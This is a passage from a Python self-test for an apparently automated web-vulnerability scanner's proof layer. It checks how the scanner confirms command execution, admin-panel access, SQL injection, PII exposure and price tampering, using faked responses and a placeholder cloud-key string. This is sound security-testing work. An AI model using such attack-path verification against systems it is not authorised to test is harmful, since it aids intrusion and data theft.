    # 10b-2) 归属不冲突：管理接口暴露属「管理面」，必须走「拿到控制权」判据。
    #        它曾经同时出现在匿名数据组里，被先注册的证明器抢走 ——
    #        后果是管理功能那一类结论永远出不来。
    _p_admin = find_prover(_FakeFinding("WSTG-CONF-05"))
    if not _p_admin or _p_admin[3] is not prove_admin_reachable:
        problems.append(
            "WSTG-CONF-05（管理接口暴露）未命中「管理功能可达」证明器"
            "（被匿名数据证明器抢走了）")

    # 10c) 与「能否读到数据」无关的项**必须没有**证明器。
    #      曾经 prove_unauth_data 的匹配式写了 `"EXT-"`，把整个扩展清单
    #      30 多项都吞了：安全响应头缺失、端口暴露、组件版本…… 全部被拿去
    #      证明「能不能读到数据」，产出一批「未达成」。这些结论既无意义，
    #      又会被读者读成「我们试过拿数据、拿不到」。宽前缀 = 伪装成白名单的黑名单。
    _must_not = [
        "WSTG-CONF-07", "WSTG-CONF-09", "WSTG-CONF-10", "WSTG-CONF-11",
        "WSTG-CONF-12", "WSTG-CONF-13", "WSTG-CONF-14",
        "EXT-CL-01", "EXT-CL-02", "EXT-CL-03", "EXT-CL-04", "EXT-CL-05",
        "EXT-CL-06", "EXT-CL-07", "EXT-CL-09",
        "EXT-SC-01", "EXT-SC-02", "EXT-SC-03", "EXT-SC-05", "EXT-SC-06",
        "EXT-SC-08", "EXT-DP-03",
    ]
    for iid in _must_not:
        if find_prover(_FakeFinding(iid)) is not None:
            problems.append(f"与数据可达无关的项不应被套证明器：{iid}")

    # 10d) 应命中的项必须命中（防止把匹配式收得过窄，把该证的全漏了）
    for iid in ("WSTG-CONF-04", "EXT-CD-03", "EXT-DP-04", "EXT-DP-01",
                "WSTG-ATHZ-04", "WSTG-ATHZ-01", "WSTG-APIT-02"):
        if find_prover(_FakeFinding(iid)) is None:
            problems.append(f"数据可达类项未命中证明器，能力被漏掉：{iid}")

    # 11) 每条已注册路径的**每一步**都必须绑定执行体。
    #     没绑执行体的步骤不是「无害的装饰」——`_run_path()` 会停在它上面，
    #     后面真正做证明的步骤永远跑不到，报告里就会出现
    #     「结果证明层已实测拿到数据，攻击目标却写未能验证」这种自相矛盾。
    for p in _paths():
        if not p.steps:
            problems.append(f"路径没有任何步骤：{p.path_id}")
        for s in p.steps:
            if s.run is None:
                problems.append(
                    f"步骤未绑定执行体（会把整条路径短路）："
                    f"{p.path_id}/{s.step_id} {s.name}")

    # 12) 「发现入口」这一环必须真能跑出结论 —— 有线索=已达成、无线索且
    #     检查项通过=未达成、无线索且检查项未执行=未能验证。三态都要走一遍。
    lead = [s for s in [p for p in _paths() if p.path_id == "READ-02"][0].steps
            if s.step_id == "READ-02-s1"][0]
    c_lead_ok = _FakeCtx({})
    c_lead_ok.findings = [_FakeFinding("WSTG-ATHZ-02", "https://t.test/api/u")]
    if lead.run(c_lead_ok).result != PROVEN:
        problems.append("有线索时「发现入口」应判已达成")
    c_lead_no = _FakeCtx({})
    c_lead_no.findings = []
    c_lead_no._cache["item_states"] = {"WSTG-ATHZ-02": _STATE_OK}
    if lead.run(c_lead_no).result != NOT_PROVEN:
        problems.append("无线索且检查项通过时「发现入口」应判未达成")
    c_lead_unk = _FakeCtx({})
    c_lead_unk.findings = []
    if lead.run(c_lead_unk).result != INCONCLUSIVE:
        problems.append("无线索且检查项未执行时「发现入口」应判未能验证")

    # 13) 「明文暴露 PII」类发现必须用 PII 判据，不得用「是否结构化数据」判据。
    #     这两者混用会产出与证据自相矛盾的结论：发现说「响应里有手机号」，
    #     证明器却说「响应不具数据形态 → 未达成」。
    _p_pii = find_prover(_FakeFinding("EXT-DP-01"))
    if _p_pii is None:
        problems.append("EXT-DP-01（响应中明文暴露敏感数据）未命中证明器")
    elif _p_pii[3] is not prove_pii_in_response:
        problems.append(
            "EXT-DP-01 命中了错误的证明器（应为 PII 明文判据，"
            "而不是「响应是否为结构化数据」判据）")
    if "EXT-DP-01" in _PAT_UNAUTH:
        problems.append("EXT-DP-01 不得留在匿名结构化数据证明器的匹配组里")
    # PII 明文命中 → 已达成；未命中 → 未能验证（记录不一致，不是未达成）
    _d_pii = "命中类型与脱敏片段：\n  · 手机号 → 13*******34"
    _c_pii = _FakeCtx({"u_pii": {"status": 200,
                                 "body": "<html>联系方式：张三 13812345678</html>"}})
    _f_pii = _FakeFinding("EXT-DP-01", "https://t.test/u_pii", detail=_d_pii)
    _o_pii = prove_pii_in_response(_c_pii, _f_pii)
    if _o_pii.state != PROVEN:
        problems.append(
            f"响应含 PII 明文时应判已达成，实际 {_o_pii.state}（{_o_pii.reason}）")
    # 证据里绝不能回写原始 PII 值
    if any("13812345678" in str(e) for e in _o_pii.evidence):
        problems.append("PII 证明的证据里回写了原始敏感值，必须只记录规则名")
    # 占位示例（13800138000 属占位值表）不得被判为「已达成」——
    # 检测器与证明器必须用同一份过滤规则，否则证据里的类型会两边对不上。
    _c_ph = _FakeCtx({"u_ph": {"status": 200,
                               "body": "<html>示例手机号 13800138000</html>"}})
    _o_ph = prove_pii_in_response(
        _c_ph, _FakeFinding("EXT-DP-01", "https://t.test/u_ph", detail=_d_pii))
    if _o_ph.proven:
        problems.append("占位示例值不得被判为「拿到数据」（与检测器判据不一致）")
    _c_pii2 = _FakeCtx({"u_clean": {
        "status": 200,
        "body": "<html>欢迎光临，这是一段普通页面内容，未包含任何个人信息。</html>"}})
    _o_pii2 = prove_pii_in_response(
        _c_pii2, _FakeFinding("EXT-DP-01", "https://t.test/u_clean", detail=_d_pii))
    if _o_pii2.state == NOT_PROVEN:
        problems.append("PII 未复现时不得判「未达成」（没复现不等于不存在）")
    elif _o_pii2.state != INCONCLUSIVE:
        problems.append(f"PII 未复现时应判未能验证，实际 {_o_pii2.state}")
    _c_pii3 = _FakeCtx({"u_err": {"status": 500, "body": "err"}})
    _o_pii3 = prove_pii_in_response(
        _c_pii3, _FakeFinding("EXT-DP-01", "https://t.test/u_err", detail=_d_pii))
    if _o_pii3.state != INCONCLUSIVE:
        problems.append(f"重取失败时应判未能验证，实际 {_o_pii3.state}")
    # 同一 item_id 下的「前端密钥类」发现：PII 判据不适用，不得报「未复现 PII」。
    # 判据错配产出的结论既无关又会被误读成「试过了拿不到」。
    _c_sec = _FakeCtx({"u_js": {"status": 200, "body": "var k='AKIAXXXXXXXXXXXXXXXX'"}})
    _o_sec = prove_pii_in_response(
        _c_sec, _FakeFinding("EXT-DP-01", "https://t.test/u_js",
                             detail="命中类型：云访问密钥（AKIA…）"))
    if _o_sec.proven:
        problems.append("非 PII 类发现不得被判为「拿到数据」")
    if "未复现" in _o_sec.reason:
        problems.append("判据不适用时不得报「未复现 PII」（判据错配）")

    # 14) 「拿到控制权（管理功能）」，双向：
    #     一个登录页能打开是完全正常的，把它算成控制权是本类最大的误报来源。
    _admin_ok = _FakeCtx({"admin": {
        "status": 200,
        "body": "<html><h1>用户管理</h1><div>角色管理 / 权限管理</div></html>"}})
    out_a = prove_admin_reachable(
        _admin_ok, _FakeFinding("WSTG-CONF-05", "https://t.test/admin"))
    if not out_a.proven:
        problems.append(
            f"含管理功能实质内容的页面应判已达成，实际 {out_a.state}（{out_a.reason}）")

    _admin_login = _FakeCtx({"admin": {
        "status": 200,
        "body": "<html><form><input type='password' name='pwd'></form>"
                "用户登录</html>"}})
    out_b = prove_admin_reachable(
        _admin_login, _FakeFinding("WSTG-CONF-05", "https://t.test/admin"))
    if out_b.proven or not out_b.inconclusive:
        problems.append(
            "口令表单页不得被判成「拿到控制权」—— 登录页可访问属正常，"
            "把它算成战果就是纯自造的误报")

    # 兜底页：管理端点与随机路径返回同一内容 → 不得判已达成
    _admin_fb = _FakeCtx({"admin": {
        "status": 200, "body": "<html>empty page fallback</html>"}})
    out_c = prove_admin_reachable(
        _admin_fb, _FakeFinding("WSTG-CONF-05", "https://t.test/admin"))
    if out_c.proven:
        problems.append(
            "管理端点与随机路径返回同一内容（兜底页 / 整站同码）时不得判已达成")

    # 15) 命令执行：**「响应里出现标记」必须与「参数被回显」区分开**。
    #     这是本类最典型的误报 —— 把反射参数当命令输出。
    def _exec_real(url):
        from urllib.parse import parse_qsl, urlsplit
        q = dict(parse_qsl(urlsplit(url).query))
        v = q.get("q", "")
        mark = v.split("echo ", 1)[1].strip() if "echo " in v else ""
        # 真实执行：响应里只有命令输出，不含载荷原文
        return {"status": 200, "body": f"<html>result:{mark}</html>"}

    _exec_ok = _FakeCtx({"q=": _exec_real})
    out_e1 = prove_command_execution(
        _exec_ok, _FakeFinding("WSTG-INPV-12", "https://t.test/a?q=1", "q"))
    if not out_e1.proven:
        problems.append(
            f"命令输出可回显时应判已达成，实际 {out_e1.state}（{out_e1.reason}）")

    def _exec_reflect(url):
        from urllib.parse import parse_qsl, urlsplit
        q = dict(parse_qsl(urlsplit(url).query))
        # 参数被原样回显：响应里带着完整载荷原文
        return {"status": 200, "body": f"<html>you sent:{q.get('q', '')}</html>"}

    _exec_ref = _FakeCtx({"q=": _exec_reflect})
    out_e2 = prove_command_execution(
        _exec_ref, _FakeFinding("WSTG-INPV-12", "https://t.test/a?q=1", "q"))
    if out_e2.proven or not out_e2.inconclusive:
        problems.append(
            "参数被原样回显时不得判「命令已执行」"
            "（响应含完整载荷原文，与命令输出无法区分）")

    # 16) 修改数据：没有实测证据时必须判「未能验证」，不许凭「发现存在」下结论
    _write_none = _FakeCtx({})
    out_w1 = prove_write_persisted(
        _write_none,
        _FakeFinding("WSTG-BUSL-03", "https://t.test/api/order/save", "amount"))
    if out_w1.proven or not out_w1.inconclusive:
        problems.append("没有写差分实测证据时不得判「可以改数据」")

    from types import SimpleNamespace as _SNS  # noqa: PLC0415

    _write_ok = _FakeCtx({})
    _write_ok._cache["business_diffs"] = ([_SNS(
        kind="AMOUNT", endpoint="https://t.test/api/order/save", method="POST",
        param="amount", original="100", tampered="0.01", verdict="PROVEN",
        detail="", changed_fields=["total"], derived_fields=["total"])], [], [])
    out_w2 = prove_write_persisted(
        _write_ok, _FakeFinding("WSTG-BUSL-03", "https://t.test/api/x", "amount"))
    if not out_w2.proven:
        problems.append(
            f"写差分确证时应判已达成，实际 {out_w2.state}（{out_w2.reason}）")
    elif ("持久化" not in out_w2.detail
          and "持久化" not in " ".join(out_w2.evidence)):
        problems.append(
            "「服务端采纳客户端数据」必须写明它不等于「已落库」"
            "（证据强度不同，不得含糊表述）")

    if problems:
        print("结果证明层自测失败：")
        for x in problems:
            print("  -", x)
        return 1

    if _prev_sqlmap_env is None:
        os.environ.pop("AISCAN_SQLMAP", None)
    else:
        os.environ["AISCAN_SQLMAP"] = _prev_sqlmap_env

    print("结果证明层自测通过：")
    print("  ✓ HTML 页面不被判为数据；JSON 数组会")
    print("  ✓ SQL 报错回显 → 已达成（附对照实验）")
    print("  ✓ SQL 无回显 → 未能验证，不误判为已达成或未达成")
    print("  ✓ sqlmap 多手法验证确证注入 → 已达成（原先只能交人工）")
    print("  ✓ sqlmap 未确证 → 未能验证，不误判为未达成")
    print("  ✓ sqlmap 未执行时理由写明「没测」，不与「测了没有」混淆")
    print("  ✓ 200 欢迎页不被判为匿名取回业务数据")
    print("  ✓ 真实业务数据 → 已达成")
    print("  ✓ 端点与随机路径同内容 → 未能验证")
    print("  ✓ 单账号场景越权证明 → 未能验证")
    print("  ✓ 检查项判通过且无线索 → 未达成")
    print("  ✓ 检查项未执行 → 未能验证（不误判为未达成）")
    print("  ✓ 证明器注册表命中正确，且取最具体匹配（越权不被家族模式抢走）")
    print("  ✓ 与数据可达无关的项不被套证明器（响应头/端口/组件类）")
    print("  ✓ 每条路径的每一步都绑定了执行体（无占位步骤）")
    print("  ✓ 「发现入口」三态齐全：有线索/无线索且通过/无线索且未执行")
    print("  ✓ 「明文暴露 PII」用 PII 判据而非「是否结构化数据」判据"
          "（未复现 → 未能验证，不判未达成）")
    print("  ✓ 同一 item_id 下的非 PII 发现（如前端密钥）不套 PII 判据（判据错配防护）")
    print("  ✓ PII 判据与检测器共用同一份过滤（占位示例两边都不算，类型统计一致）")
    print("  ✓ 管理功能可达：口令表单页 / 兜底页都不算「拿到控制权」")
    print("  ✓ 命令执行：响应含完整载荷原文（参数回显）时不判「命令已执行」")
    print("  ✓ 修改数据：无实测证据判「未能验证」；「被采纳」不表述成「已落库」")
    return 0


def _paths():
    """返回全部已注册的攻击路径（本模块导入时已注册）。"""
    from engine.redteam import registered_paths
    return registered_paths()


if __name__ == "__main__":
    sys.exit(_selftest())
